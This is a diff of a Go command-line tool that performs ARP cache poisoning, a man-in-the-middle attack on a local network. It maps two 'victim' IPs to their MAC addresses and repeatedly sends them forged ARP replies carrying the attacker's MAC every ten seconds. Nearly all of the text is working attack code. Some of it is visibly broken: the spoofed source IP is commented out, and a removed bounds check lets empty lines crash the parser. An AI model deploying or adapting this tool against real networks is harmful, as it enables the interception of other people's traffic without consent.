@@ -9,6 +9,7 @@ import (
 	"os/exec"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -45,21 +46,22 @@ func ping(ips ...string) {
 	wg.Wait()
 }
 
-type IPtoMAC struct {
-	IPtoMAC map[string]string
-	mu      sync.Mutex
+type DeviceInfo struct {
+	IP  string
+	MAC string
 }
 
-func NewIPtoMAC() *IPtoMAC {
-	return &IPtoMAC{
-		IPtoMAC: make(map[string]string),
+func NewDeviceInfo(ip, mac string) *DeviceInfo {
+	return &DeviceInfo{
+		IP:  ip,
+		MAC: mac,
 	}
 }
 
-func mapIPstoMAC(ips ...string) (*IPtoMAC, error) {
+func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 	ping(ips...)
 
-	ipToMAC := NewIPtoMAC()
+	var devices []*DeviceInfo
 
 	data := exec.Command("arp", "-a")
 	byteData, err := data.Output()
@@ -69,92 +71,92 @@ func mapIPstoMAC(ips ...string) (*IPtoMAC, error) {
 
 	lines := strings.Split(string(byteData), "\n")
 
-	var wg sync.WaitGroup
 	for _, ip := range ips {
-		wg.Add(1)
-		go func(ip string) {
-			defer wg.Done()
-
-			skip := false
-			for _, line := range lines {
-				if len(line) <= 0 {
-					continue
-				}
-
-				// thank you: https://github.com/mostlygeek/arp/blob/master/arp_windows.go
-				// interface lines don't start with whitespace. skip these
-				if line[0] != ' ' {
-					skip = true
-					continue
-				}
-
-				// skip the header lines
-				if skip {
-					skip = false
-					continue
-				}
-
-				// break up columns into fields
-				fields := strings.Fields(line)
-
-				if fields[0] == ip {
-					ipToMAC.mu.Lock()
-					ipToMAC.IPtoMAC[ip] = fields[1]
-					ipToMAC.mu.Unlock()
-				}
+		skip := false
+		for _, line := range lines {
+			if line[0] != ' ' {
+				skip = true
+				continue
 			}
-		}(ip)
+			if skip {
+				skip = false
+				continue
+			}
+			fields := strings.Fields(line)
+			if ip == fields[0] {
+				devices = append(devices, NewDeviceInfo(fields[0], fields[1]))
+				break
+			}
+		}
 	}
 
-	wg.Wait()
-
-	return ipToMAC, nil
+	return devices, nil
 }
 
-// TODO: loop through both victim's info, and spoof the ip of victim 1 as src, and victim 2's ip as dst, and vice versa
-func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
-	for ipStr, vicMACStr := range deviceInfo.IPtoMAC {
-		// build the layers
+func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+	//fromIP := net.ParseIP(from.IP)
 
-		vicMAC, err := net.ParseMAC(vicMACStr)
-		if err != nil {
-			return err
+	toMAC, err := net.ParseMAC(to.MAC)
+	if err != nil {
+		return err
+	}
+
+	toIP := net.ParseIP(to.IP)
+	/*
+		ip := layers.IPv4{
+			Version:  4,
+			TTL:      64,
+			Protocol: layers.IPProtocolTCP,
+			SrcIP:    fromIP,
+			DstIP:    toIP,
 		}
+	*/
 
-		ip := layers.IPv4{}
+	eth := layers.Ethernet{
+		SrcMAC:       attackerInfo.MAC,
+		DstMAC:       toMAC,
+		EthernetType: layers.EthernetTypeARP,
+	}
 
-		eth := layers.Ethernet{
-			SrcMAC:       attackerInfo.MAC,
-			DstMAC:       vicMAC,
-			EthernetType: layers.EthernetTypeARP,
-		}
+	arp := layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   attackerInfo.MAC,
+		SourceProtAddress: attackerInfo.IP,
+		DstHwAddress:      toMAC,
+		DstProtAddress:    toIP,
+	}
 
-		arp := layers.ARP{
-			AddrType:          layers.LinkTypeEthernet,
-			Protocol:          layers.EthernetTypeIPv4,
-			HwAddressSize:     6,
-			ProtAddressSize:   4,
-			Operation:         layers.ARPReply,
-			SourceHwAddress:   attackerInfo.MAC,
-			SourceProtAddress: attackerInfo.IP,
-			DstHwAddress:      vicMAC,
-			DstProtAddress:    net.ParseIP(ipStr),
-		}
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
 
-		// set up packet to write
-		buf := gopacket.NewSerializeBuffer()
-		opts := gopacket.SerializeOptions{
-			FixLengths:       true,
-			ComputeChecksums: true,
-		}
+	if err = gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
+		return err
+	}
 
-		if err = gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
-			return err
-		}
+	if err = deviceHandle.WritePacketData(buf.Bytes()); err != nil {
+		return err
+	}
 
-		if err = deviceHandle.WritePacketData(buf.Bytes()); err != nil {
-			return err
-		}
+	return nil
+}
+
+func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+	dev1 := devicesInfo[0]
+	dev2 := devicesInfo[1]
+
+	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle); err != nil {
+		return err
+	}
+
+	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle); err != nil {
+		return err
 	}
 
 	return nil
@@ -165,7 +167,7 @@ type AttackerInfo struct {
 	IP  net.IP
 }
 
-func getDevice(ifaceArg string) (string, error) {
+func getWindowsInterface(ifaceArg string) (string, error) {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		return "", err
@@ -238,7 +240,6 @@ func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
 	return &info, nil
 }
 
-// TODO
 func readPackets(deviceHandle *pcap.Handle) error {
 	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())
 
@@ -251,20 +252,24 @@ func readPackets(deviceHandle *pcap.Handle) error {
 
 func main() {
 	if len(os.Args) != 4 {
-		fmt.Println("usage: <interface> <router ip> <target ip>")
+		fmt.Println("usage: <interface> <victim1 ip> <victim2 ip>")
 		os.Exit(0)
 	}
 
-	if err := checkIPs(os.Args[2], os.Args[3]); err != nil {
+	interfaceStr := os.Args[1]
+	victim1IPStr := os.Args[2]
+	victim2IPStr := os.Args[3]
+
+	if err := checkIPs(victim1IPStr, victim2IPStr); err != nil {
 		log.Fatal(err)
 	}
 
-	attackerInfo, err := getAttackerInfo(os.Args[1])
+	attackerInfo, err := getAttackerInfo(interfaceStr)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	device, err := getDevice(os.Args[1])
+	device, err := getWindowsInterface(interfaceStr)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -275,7 +280,7 @@ func main() {
 	}
 	defer deviceHandle.Close()
 
-	IPtoMAC, err := mapIPstoMAC(os.Args[2], os.Args[3])
+	devicesInfo, err := mapIPstoMAC(victim1IPStr, victim2IPStr)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -292,8 +297,9 @@ func main() {
 	}()
 
 	for {
-		if err = poisonARPCache(IPtoMAC, attackerInfo, deviceHandle); err != nil {
+		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle); err != nil {
 			log.Fatal(err)
 		}
+		time.Sleep(time.Second * 10)
 	}
 }
